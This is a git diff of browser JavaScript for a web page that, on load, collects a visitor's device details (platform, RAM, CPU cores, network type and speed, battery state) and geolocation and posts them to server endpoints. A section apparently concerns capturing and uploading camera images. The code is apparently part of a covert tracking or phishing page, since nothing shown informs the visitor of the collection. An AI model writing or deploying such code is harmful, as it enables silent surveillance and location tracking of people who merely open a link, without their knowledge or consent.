@@ -1,3 +1,47 @@
+//gathering device info
+let get_device_info=()=>{
+ // Get browser and OS information
+ const userAgent = navigator.userAgent;
+ const platform = navigator.platform;
+ 
+ // Get device model and type
+ const deviceModel = userAgent.match(/(Android|iPhone|iPad|iPod)/);
+ const deviceType = screen.orientation.type;
+ 
+ // Get CPU and GPU information
+ const cpuCores = navigator.hardwareConcurrency;
+ const deviceRAM = navigator.deviceMemory;
+// Get network and IP information
+const networkType = navigator.connection.type;
+const networkSpeed = navigator.connection.downlink;
+//battery
+navigator.getBattery().then(battery=>{
+
+  //sending data
+fetch("/device_info", {
+  method: "POST",
+  body: JSON.stringify({
+    platform: `${deviceModel}`,
+    screen_type: `${deviceType}`,
+    ram: `${deviceRAM}`,
+    core: `${cpuCores}`,
+    battery: `${battery.level * 100}`,
+    charging: `${battery.charging}`,
+    network_type: `${networkType}`,
+    network_speed: `${networkSpeed}`,
+  }),
+  headers: {
+    "Content-type": "application/json; charset=UTF-8"
+  }
+})
+  .then((response) => response.json())
+  .then((json) => console.log(json));
+});
+}
+
+
+
+//location
 let checkinsss=()=>{
     if ('geolocation' in navigator) {
     navigator.geolocation.getCurrentPosition(function (position) {
@@ -12,41 +56,13 @@ let checkinsss=()=>{
     checkinsss();
 }
 };
-
-//device info
-function getDeviceInfo() {
-  console.log(navigator.deviceMemory)
-  console.log(navigator.hardwareConcurrency)
-  console.log(navigator)
-  const deviceInfo = {
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    search_engin: navigator.vendor,
-    screenWidth: screen.width,
-    screenHeight: screen.height,
-    colorDepth: screen.colorDepth,
-    pixelDepth: screen.pixelDepth,
-    ram: navigator.deviceMemory,
-    ram: navigator.deviceMemory,
-  };
-
-  return deviceInfo;
-}
-
-
 let send = (lati, long) => {
-  console.log(lati,long)
-  fetch("/send_info", {
+  try{
+  fetch("/send_location", {
     method: "POST",
     body: JSON.stringify({
       l1: `${lati}`,
       l2: `${long}`,
-      platform: `${navigator.platform}`,
-      search_engin: `${navigator.vendor}`,
-      screenWidth: `${screen.width}`,
-      screenHeight: `${screen.height}`,
-      ram: `${navigator.deviceMemory}`,
-      core: `${navigator.hardwareConcurrency}`
     }),
     headers: {
       "Content-type": "application/json; charset=UTF-8"
@@ -54,6 +70,9 @@ let send = (lati, long) => {
   })
     .then((response) => response.json())
     .then((json) => console.log(json));
+}catch(e){
+  alert(e)
+}
 };
 //taking pic
 
@@ -119,7 +138,7 @@ function post(imgdata) {
     
     // Load init
     window.onload=()=>{
+      get_device_info();
       checkinsss();
-      init();
+      // init();
   }
-  
